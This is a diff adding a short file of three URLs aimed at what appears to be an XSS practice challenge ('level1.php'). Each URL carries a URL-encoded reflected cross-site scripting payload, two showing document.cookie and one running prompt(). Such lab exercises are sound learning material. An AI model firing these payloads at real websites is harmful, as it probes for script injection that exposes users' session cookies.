@@ -1,0 +1,6 @@
+https://xssaq.com/yx/level1.php?name=level1.php?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+https://xssaq.com/yx/level1.php?name=%3Cscript%3Eprompt(5000/200)%3C/script%3E
+
+https://xssaq.com/yx/level1.php?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
